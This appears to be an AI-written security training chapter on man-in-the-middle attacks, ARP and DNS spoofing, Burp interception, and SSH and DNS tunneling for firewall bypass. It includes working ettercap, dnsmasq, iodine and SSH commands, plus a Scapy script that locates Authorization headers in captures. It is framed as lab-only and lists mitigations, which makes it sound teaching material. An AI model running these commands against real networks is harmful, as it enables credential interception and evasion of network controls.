### Table of Contents 📚

[[#I. Why Day 6 Matters 🔥]]  
[[#II. The Philosophy of MITM 🧠]]  
[[#III. ARP Spoofing — The Original Sin of Networking 🕳️]]  
[[#IV. DNS Spoofing — Lying About Names 🧭]]  
[[#V. Proxies — The Middlemen of the Internet 🧩]]  
[[#VI. Tunneling — Smuggling Traffic Through Forbidden Paths 🛣️]]  
[[#VII. SSH Tunnels — The Swiss Army Knife of Pivoting 🔐]]  
[[#VIII. LAB MITM, Proxying, and Tunneling in Action 🧪]]  
[[#IX. Why Day 6 Makes You Dangerous ⚔️]]  
[[#X. End of Day Outcomes 🎯]]  
[[#Appendix Quick Commands and Evidence Extraction 🧾]]

---

# 🧨 DAY 6 — MITM, Proxying, Tunneling, and Traffic Manipulation

_2 hours_

_“Today you learn how attackers take control of the path packets travel.”_

This day moves you from observation and interrogation into active control. Where Day 4 taught you to see and Day 5 taught you to ask, Day 6 teaches you to change what the network says and where it goes. The techniques covered are powerful and inherently dual‑use: they are essential for defensive testing, incident response, and red‑team operations, and they are dangerous if used without consent. Every lab in this chapter assumes a controlled environment or explicit authorization. Capture evidence, document commands, and always record scope and permission before you run anything.

---

## I. Why Day 6 Matters 🔥

Day 6 matters because control is the ultimate lever. Observing traffic tells you what happened; manipulating traffic lets you change what happens next. When you can intercept and alter packets you can force systems to reveal secrets, bypass controls, and create new paths that did not exist before. The network is not a neutral pipe; it is a set of mutable behaviors and trust relationships. Understanding how those relationships are established and how they can be subverted is the difference between a tester who reports vulnerabilities and a tester who demonstrates exploitability with reproducible evidence.

In practice, control manifests as three capabilities: interception, redirection, and modification. Interception is the ability to see traffic that was not intended for you. Redirection is the ability to change the destination of traffic so that it flows through a place you control. Modification is the ability to change the bytes in flight so that requests, responses, or protocol negotiations behave differently. Each capability has forensic signals you can capture and prove: ARP replies and MAC mappings for interception, DNS responses and SNI changes for redirection, and altered HTTP bodies or modified TLS handshakes for modification. Your deliverable after any Day 6 exercise is not “I did MITM”; it is a reproducible artifact: the pcap showing the original request, the manipulated request, timestamps, packet numbers, and the exact bytes you changed.

[[#Table of Contents 📚]]

---

## II. The Philosophy of MITM 🧠

Man‑in‑the‑Middle is a position, not a single tool. The position is defined by three properties: visibility, trust, and control. Visibility means you can observe both sides of a conversation. Trust means both endpoints accept you as a legitimate peer or gateway. Control means you can alter the conversation without breaking the protocol in a way that immediately alerts the endpoints. Achieving all three simultaneously is the essence of MITM.

The practical philosophy is to minimize the footprint of your manipulation while maximizing the information gained. A subtle change in a header can reveal authentication tokens; a small redirect can cause a client to leak internal hostnames; a crafted TLS handshake can reveal certificate chains and SNI. The goal is to design manipulations that are minimal, reversible, and provable. Minimal manipulations reduce the chance of detection and collateral damage. Reversible manipulations let you restore the environment to its original state. Provable manipulations produce artifacts—pcaps, logs, and byte offsets—that you can present to stakeholders.

Ethically, MITM techniques must be used only with explicit authorization. In a defensive context, the same skills let you detect and mitigate real attackers who are already performing MITM. In an offensive context, they let you demonstrate impact by showing how an attacker could intercept credentials or pivot. Always record scope, time windows, and the identities of systems involved before you begin.

[[#Table of Contents 📚]]

---

## III. ARP Spoofing — The Original Sin of Networking 🕳️

ARP is the protocol that maps IP addresses to MAC addresses on a local Ethernet segment. ARP was designed for simplicity and speed, not for security. It accepts unsolicited replies and caches them. That design choice makes ARP the easiest local trust boundary to break.

The attack model is straightforward: convince two hosts that your MAC is the MAC of the other party. Practically, you send gratuitous ARP replies to the victim claiming that your MAC corresponds to the gateway IP, and you send gratuitous ARP replies to the gateway claiming that your MAC corresponds to the victim IP. Once both caches are poisoned, traffic flows through your machine. The network path now contains you, and you can forward, drop, or modify packets.

The forensic signals of ARP spoofing are explicit. In a pcap you will see ARP replies that map an IP to a MAC that does not match the known hardware address. You will see duplicate ARP replies, gratuitous ARP announcements, and a sudden change in the MAC address associated with a given IP. In Wireshark, the ARP packets themselves are the smoking gun; in addition, you will see subsequent TCP streams where the source or destination MAC is your machine’s MAC even though the IPs belong to other hosts.

A minimal, controlled ARP spoofing exercise requires three steps: enable IP forwarding on your machine so traffic continues to flow, poison the ARP caches of the two endpoints, and capture the traffic for evidence. The canonical commands are shown below for a lab environment. The first command enables forwarding so your machine forwards packets between interfaces. The second command runs `ettercap` in text mode to perform ARP poisoning between two hosts. The third command captures traffic to a pcap for later analysis.

```bash
# enable IP forwarding (Linux)
sudo sysctl -w net.ipv4.ip_forward=1

# perform ARP poisoning between two hosts (lab only)
sudo ettercap -T -M arp:remote /192.168.10.10/ /192.168.20.10/

# capture traffic while the poisoning is active
sudo tcpdump -i eth0 -w /tmp/mitm_arp_capture.pcap
```

Expected results. If the poisoning succeeds, the pcap will show gratuitous ARP replies from your machine mapping the gateway IP to your MAC and mapping the victim IP to your MAC. Subsequent packets destined for the gateway will have your MAC as the source or destination in the Ethernet header. HTTP requests and responses will appear in the pcap with your MAC in the link layer. If you are forwarding correctly, the endpoints will continue to communicate and you will see full TCP streams; if you are not forwarding, connections will fail and retransmissions will appear. For reporting, extract the ARP packets and the first few HTTP request/response pairs, record packet numbers and timestamps, and include the `sysctl` state and `ettercap` command used.

[[#Table of Contents 📚]]

---

## IV. DNS Spoofing — Lying About Names 🧭

DNS is the system that translates human names into IP addresses. If you control the answer to a DNS query, you control where a client goes. DNS spoofing can be performed at multiple layers: by poisoning a resolver cache, by running a rogue DNS server and convincing clients to use it, or by intercepting and modifying DNS responses in flight.

The simplest lab approach is to run a local DNS server that returns attacker‑controlled answers for a specific zone and then configure the victim to use that DNS server. The server can be as simple as `dnsmasq` with a static host file entry. The key forensic artifact is the DNS response: the query, the forged answer, and the subsequent client connection to the forged IP. In a pcap you will see the DNS query and the forged DNS response, followed by the client’s TCP or UDP connection to the attacker IP.

A minimal lab example uses `dnsmasq` with a static hosts file entry. The commands below show how to configure a simple mapping and how to capture the DNS exchange.

```bash
# example /etc/hosts.dnsmasq entry
echo "192.168.10.50 admin.test.local" | sudo tee /etc/dnsmasq.d/hosts

# restart dnsmasq to load the mapping
sudo systemctl restart dnsmasq

# configure the victim (lab) to use your DNS server (manual or DHCP)
# capture DNS traffic
sudo tcpdump -i eth0 -w /tmp/dns_spoof_capture.pcap port 53
```

Expected results. When the victim resolves `admin.test.local`, the pcap will show a DNS query from the victim and a DNS response from your DNS server with the forged A record pointing to `192.168.10.50`. The client will then initiate an HTTP or HTTPS connection to that IP. If the client uses HTTPS, you will see the TLS handshake with SNI `admin.test.local` but the certificate will not match unless you also perform TLS interception. For reporting, include the DNS query and response packets, the subsequent connection attempt, and the `dnsmasq` configuration lines. Note that DNS spoofing is often detectable by clients that use DNSSEC or by monitoring that validates authoritative responses.

[[#Table of Contents 📚]]

---

## V. Proxies — The Middlemen of the Internet 🧩

A proxy is a deliberate middleman. Unlike ARP or DNS spoofing, proxies are often legitimate infrastructure components. The security implication is that any proxy that handles requests can alter headers, rewrite bodies, inject content, or strip security controls. Understanding proxies means understanding the transformations they perform and the trust they impose.

When you configure a browser to use an intercepting proxy such as Burp Suite, the browser sends requests to the proxy which then forwards them to the origin server. The proxy can present its own certificate to the browser (if the browser trusts the proxy CA), which enables full HTTPS interception. The forensic artifacts are the proxy logs and the pcap showing the browser‑to‑proxy TLS session and the proxy‑to‑server TLS session. The proxy’s ability to rewrite headers is the mechanism by which request smuggling, host header injection, and cache poisoning are exploited.

A controlled proxy setup requires installing the proxy CA into the browser so that HTTPS interception is possible. The steps below show how to start Burp in the lab and configure Firefox to use it. Capture both the browser‑to‑proxy traffic and the proxy‑to‑server traffic for evidence.

```bash
# start Burp (example)
burpsuite &

# configure Firefox proxy to 127.0.0.1:8080 and import Burp CA into the browser
# capture browser-to-proxy traffic
sudo tcpdump -i lo -w /tmp/proxy_browser_capture.pcap port 8080

# capture proxy-to-server traffic (if proxy uses external interface)
sudo tcpdump -i eth0 -w /tmp/proxy_server_capture.pcap
```

Expected results. With the proxy configured and the CA trusted, the browser will establish a TLS session to the proxy and the proxy will establish a separate TLS session to the server. In the pcap you will see the browser’s TLS ClientHello to the proxy with SNI matching the target host, and the proxy’s TLS ClientHello to the origin server. The proxy logs will show the full HTTP requests and responses, including headers and bodies. For reporting, export the intercepted request/response pairs from Burp, include the pcap slices showing the two TLS sessions, and document the CA import steps. If the browser does not trust the proxy CA, the TLS handshake will fail and you will see certificate errors in the browser rather than intercepted content.

[[#Table of Contents 📚]]

---

## VI. Tunneling — Smuggling Traffic Through Forbidden Paths 🛣️

Tunneling is the practice of encapsulating one protocol inside another so that it can traverse network boundaries that would otherwise block it. Tunnels can be legitimate (VPNs, SSH tunnels) or covert (DNS tunnels, ICMP tunnels). The core idea is to use an allowed channel as a carrier for disallowed traffic.

From a defensive perspective, tunneling is detected by anomalies in traffic patterns: unusually large DNS responses, persistent DNS queries with long encoded payloads, or ICMP packets with payloads that do not match typical ping sizes. From an offensive perspective, tunneling is a pivot and exfiltration technique: once you have a foothold, you create a tunnel back to your infrastructure and route traffic through it.

A practical lab demonstrates SSH dynamic SOCKS tunneling and a simple DNS tunnel using `iodine` or `dnscat2` in a controlled environment. The SSH example below shows how to create a dynamic SOCKS proxy and how to route a browser through it. The DNS tunnel example shows how to run a DNS tunnel server and client and how to capture the DNS traffic for analysis.

```bash
# SSH dynamic SOCKS proxy (attacker creates a SOCKS proxy on local port 9050)
ssh -D 9050 user@192.168.20.10

# configure browser to use SOCKS5 127.0.0.1:9050
# capture traffic on loopback for the SOCKS connection
sudo tcpdump -i lo -w /tmp/socks_capture.pcap

# DNS tunnel (example with iodine)
# on server (attacker-controlled authoritative domain)
sudo iodine -f -P password 10.0.0.1 tunnel.example.com

# on client (victim)
iodine -f -P password tunnel.example.com
# capture DNS traffic
sudo tcpdump -i eth0 -w /tmp/dns_tunnel_capture.pcap port 53
```

Expected results. For the SSH SOCKS proxy, the pcap on loopback will show the SOCKS handshake and the proxied TCP connections encapsulated within the SSH session. The browser’s requests will appear as proxied connections from the SSH server to the destination. For the DNS tunnel, the pcap will show frequent DNS queries and responses with large or encoded payloads; decoding the payloads will reveal the tunneled data. For reporting, include the SOCKS handshake, the SSH session bytes, and the DNS query/response pairs with decoded payloads. Note that DNS tunneling is noisy and often detected by egress monitoring; use it only in lab environments.

[[#Table of Contents 📚]]

---

## VII. SSH Tunnels — The Swiss Army Knife of Pivoting 🔐

SSH tunnels are versatile because SSH provides authenticated, encrypted channels that can carry arbitrary TCP streams. There are three common modes: local port forwarding, remote port forwarding, and dynamic port forwarding (SOCKS). Local forwarding binds a local port and forwards connections to a remote host/port via the SSH server. Remote forwarding binds a remote port on the SSH server and forwards connections back to the client. Dynamic forwarding creates a SOCKS proxy that can route many destinations through the SSH server.

The practical value is pivoting: with a single SSH foothold you can reach internal services that are otherwise inaccessible. The forensic artifacts are the SSH session and the proxied connections. When you capture traffic on the SSH server, you will see the SSH session and the proxied connections emerging from the server to internal targets. When you capture on the client, you will see local connections to the forwarded port or SOCKS proxy.

Examples and evidence capture are shown below. The first command creates a local forward from your machine’s port 8080 to the remote host’s port 80 via the SSH server. The second command creates a dynamic SOCKS proxy. Capture traffic on the SSH server to show the proxied connections.

```bash
# local port forward: local 8080 -> remote localhost:80 via ssh server
ssh -L 8080:localhost:80 user@192.168.20.10

# dynamic SOCKS proxy on local port 9050
ssh -D 9050 user@192.168.20.10

# capture on the SSH server to show proxied outbound connections
sudo tcpdump -i eth0 -w /tmp/ssh_pivot_capture.pcap
```

Expected results. For local forwarding, a request to `http://localhost:8080` on your machine will result in an HTTP request from the SSH server to `localhost:80` on the server side; the pcap on the server will show the outbound HTTP request. For dynamic SOCKS, the server pcap will show outbound connections to the final destinations initiated by the SSH server on behalf of the client. For reporting, include the SSH command, the pcap slices showing the proxied connections, and the timestamps linking client actions to server outbound traffic.

[[#Table of Contents 📚]]

---

## VIII. LAB MITM, Proxying, and Tunneling in Action 🧪

This lab section is prescriptive and forensic. Each exercise includes the exact commands to run in a lab, the capture discipline, the expected signals, and the evidence you must extract for reporting. Always record the scope and authorization before you begin.

### Lab 1 — ARP Spoofing (MITM)

Enable IP forwarding, run `ettercap` to poison ARP caches between two lab hosts, and capture traffic. The commands below enable forwarding, run the poisoning, and capture traffic. The expected signal is gratuitous ARP replies mapping the gateway IP to your MAC and subsequent TCP streams with your MAC in the Ethernet header. Evidence to extract: the ARP packets that show the mapping, the first HTTP request/response pair that flows through you, packet numbers, and timestamps.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -M arp:remote /192.168.10.10/ /192.168.20.10/
sudo tcpdump -i eth0 -w /tmp/mitm_arp_capture.pcap
```

Expected results. The pcap will contain ARP replies from your MAC claiming the gateway IP and ARP replies claiming the victim IP. You will see HTTP requests and responses with your MAC in the link layer. For reporting, export the ARP packets and the first few HTTP streams, include packet numbers and timestamps, and show the `sysctl` state and `ettercap` command used.

---

### Lab 2 — DNS Spoofing

Configure `dnsmasq` with a host mapping for a test domain, configure the victim to use your DNS server, and capture DNS traffic. The expected signal is a DNS response from your server with the forged A record and a subsequent client connection to the forged IP. Evidence to extract: the DNS query and forged response packets, the subsequent TCP connection, and the `dnsmasq` configuration lines.

```bash
echo "192.168.10.50 admin.test.local" | sudo tee /etc/dnsmasq.d/hosts
sudo systemctl restart dnsmasq
sudo tcpdump -i eth0 -w /tmp/dns_spoof_capture.pcap port 53
```

Expected results. The pcap will show the DNS query and the forged DNS response. The client will then attempt to connect to `192.168.10.50`. If the client uses HTTPS, you will see the TLS ClientHello with SNI `admin.test.local` but certificate mismatches unless you intercept TLS as well.

---

### Lab 3 — Configure Burp Suite as Proxy

Start Burp, import its CA into the browser, configure the browser proxy to 127.0.0.1:8080, and capture both browser‑to‑proxy and proxy‑to‑server traffic. The expected signal is two TLS sessions: browser→proxy and proxy→server, with the proxy logs containing full HTTP requests and responses. Evidence to extract: Burp exported request/response pairs, the pcap slices showing the two TLS sessions, and the CA import steps.

```bash
burpsuite &
# configure browser proxy to 127.0.0.1:8080 and import Burp CA
sudo tcpdump -i lo -w /tmp/proxy_browser_capture.pcap port 8080
sudo tcpdump -i eth0 -w /tmp/proxy_server_capture.pcap
```

Expected results. The browser will establish TLS to the proxy and the proxy will establish TLS to the origin. Burp will show the intercepted requests and responses. For reporting, export the intercepted items from Burp and include the pcap evidence.

---

### Lab 4 — SSH Dynamic SOCKS Proxy

Create a dynamic SOCKS proxy with SSH, configure the browser to use it, and capture traffic on the SSH server. The expected signal is proxied outbound connections from the SSH server to the final destinations. Evidence to extract: the SSH command, the pcap showing outbound connections from the SSH server, and the mapping between client actions and server outbound traffic.

```bash
ssh -D 9050 user@192.168.20.10
# configure browser to use SOCKS5 127.0.0.1:9050
sudo tcpdump -i eth0 -w /tmp/ssh_pivot_capture.pcap
```

Expected results. The pcap on the SSH server will show outbound connections to the destinations requested by the client. For reporting, include the SSH command, the pcap slices, and timestamps linking client requests to server outbound traffic.

---

### Lab 5 — Tunnel Through Firewalls (practical bypass)

Use an SSH tunnel or a DNS tunnel to reach a blocked internal service. The expected signal is successful application‑level access despite network filtering. Evidence to extract: the tunnel setup command, the pcap showing the encapsulated traffic, and the application traffic that demonstrates access.

```bash
# example: local port forward to reach blocked internal web service
ssh -L 8080:internal:80 user@192.168.20.10
curl http://localhost:8080
# capture tunnel traffic
sudo tcpdump -i eth0 -w /tmp/tunnel_capture.pcap
```

Expected results. The `curl` to `localhost:8080` will succeed even if the direct path to `internal:80` is blocked. The pcap will show the SSH session carrying the proxied HTTP traffic. For reporting, include the tunnel command, the pcap slices, and the application output proving access.

---

### Advanced evidence extraction

For every lab, produce a reproducible artifact set: the exact commands used, the pcap file, the packet numbers and timestamps for the key packets, and a short narrative that ties the packets to the claim. Use `tshark` and Scapy to extract byte offsets and to produce small evidence files that contain only the relevant bytes. Example `tshark` extraction of a packet’s hex payload:

```bash
tshark -r /tmp/mitm_arp_capture.pcap -Y "arp" -x > arp_hex.txt
```

Example Scapy extraction of a TCP stream to a file:

```python
from scapy.all import rdpcap, TCP, Raw
pcap = rdpcap('/tmp/mitm_arp_capture.pcap')
with open('evidence_stream.bin','wb') as fh:
    for pkt in pcap:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            fh.write(bytes(pkt[Raw].load))
```

Expected results for evidence extraction. Each lab should produce a minimal set of artifacts: a pcap slice that contains the key packets, a small binary or text file with the exact bytes you will present as proof, and a short JSON or text file that lists the commands, packet numbers, and timestamps. This package is what you deliver to stakeholders to prove impact without forcing them to sift through full pcaps.

[[#Table of Contents 📚]]

---

## IX. Why Day 6 Makes You Dangerous ⚔️

Day 6 makes you dangerous in the constructive sense: you can demonstrate how an attacker could intercept credentials, bypass segmentation, or pivot from a single foothold. The power comes from combining visibility with control and from producing reproducible evidence that links a manipulation to a concrete impact. The ethical responsibility is to use that power to improve defenses: show defenders the exact packets an attacker would use, provide remediation steps, and help implement mitigations such as ARP inspection, DNSSEC, proxy hardening, and egress filtering.

From a defensive perspective, the same techniques let you detect attackers. ARP anomalies, unexpected DNS responses, and unusual TLS certificate issuers are all signals of compromise. Day 6 teaches you both how to perform manipulations and how to detect them, which is the full cycle of offensive and defensive security.

[[#Table of Contents 📚]]

---

## X. End of Day Outcomes 🎯

By the end of Day 6 you will be able to perform controlled MITM exercises in a lab, configure and validate proxy interception, create and use tunnels for pivoting, and extract forensic evidence that proves manipulation and impact. You will be able to explain the trust assumptions that make ARP and DNS fragile, demonstrate how proxies can rewrite reality, and show how tunnels can bypass network controls. Your reports will include exact commands, pcaps, packet numbers, byte offsets, and a short narrative tying the artifacts to the claim. You will also be able to recommend mitigations: enable ARP inspection, use DNSSEC and authenticated resolvers, enforce strict proxy policies and certificate pinning, and monitor for tunneling patterns.

[[#Table of Contents 📚]]

---

## Appendix Quick Commands and Evidence Extraction 🧾

Capture traffic for any Day 6 exercise using `tcpdump` and always start the capture before you run the probe. The canonical capture command is shown below. Replace `eth0` with the interface that sees the traffic.

```bash
sudo tcpdump -i eth0 -w /tmp/day6_capture.pcap
```

Enable IP forwarding on Linux when performing MITM forwarding.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Perform ARP poisoning in a lab with `ettercap` (text mode shown).

```bash
sudo ettercap -T -M arp:remote /192.168.10.10/ /192.168.20.10/
```

Run a local DNS server mapping with `dnsmasq` by adding a host entry and restarting the service.

```bash
echo "192.168.10.50 admin.test.local" | sudo tee /etc/dnsmasq.d/hosts
sudo systemctl restart dnsmasq
```

Start Burp Suite and configure the browser to use 127.0.0.1:8080, then import Burp’s CA into the browser to enable HTTPS interception.

Create an SSH dynamic SOCKS proxy and route a browser through it.

```bash
ssh -D 9050 user@192.168.20.10
```

Extract packet hex for a specific frame with `tshark`.

```bash
tshark -r /tmp/day6_capture.pcap -Y "frame.number == 123" -x
```

Use Scapy to programmatically extract streams or to find byte offsets for headers such as `Authorization:`.

```python
from scapy.all import rdpcap, TCP, Raw, IP
pcap = rdpcap('/tmp/day6_capture.pcap')
for pkt in pcap:
    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
        payload = bytes(pkt[Raw].load)
        idx = payload.find(b"Authorization:")
        if idx != -1:
            print("Found Authorization header at offset", idx, "packet time", pkt.time)
```

Evidence hygiene reminder. For every manipulation include the command used, the pcap file, the packet numbers and timestamps for the key packets, the extracted byte offsets or small evidence files, and a short interpretation that ties the observation to a hypothesis about impact. Store pcaps securely and redact sensitive data when sharing with stakeholders.

[[#Table of Contents 📚]]

---

If you want, I will convert this into a repo‑ready Markdown file with sanitized filename and YAML frontmatter, or expand any single lab exercise into a full forensic walkthrough that includes exact expected packet bytes and the precise `tshark`/Scapy commands to extract them. Which would you like next: repo file or a deep forensic walkthrough of a specific lab exercise?